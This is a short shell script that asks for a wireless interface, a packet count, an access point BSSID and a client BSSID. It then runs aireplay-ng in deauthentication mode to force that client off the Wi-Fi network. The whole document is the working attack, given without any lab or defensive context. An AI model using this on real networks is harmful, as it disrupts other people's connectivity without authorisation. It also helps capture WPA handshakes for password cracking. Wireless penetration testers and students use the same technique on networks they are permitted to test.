read -p "interface : " wlan
read -p "number (1 if unsure) : " n
read -p "AP BSSID : " ap
read -p "client BSSID :  " c

sudo aireplay-ng -0 $n -a $ap -c $c $wlan 
